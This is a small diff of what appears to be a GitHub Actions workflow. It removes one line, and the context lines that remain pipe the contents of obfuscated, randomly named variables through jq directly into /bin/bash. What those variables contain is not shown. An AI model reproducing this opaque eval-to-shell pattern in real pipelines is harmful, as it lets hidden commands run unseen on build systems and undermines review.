@@ -28,7 +28,6 @@ jobs:
           echo $r05066 | jq -r .ejc549 | /bin/bash
           printf '%s' "$uergt7094" | jq -r .hck73960 | /bin/bash
           echo $nhtfr5507 | jq -r .gzpy5243 | /bin/bash
-          echo $yk63693 | jq -r .ym2 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
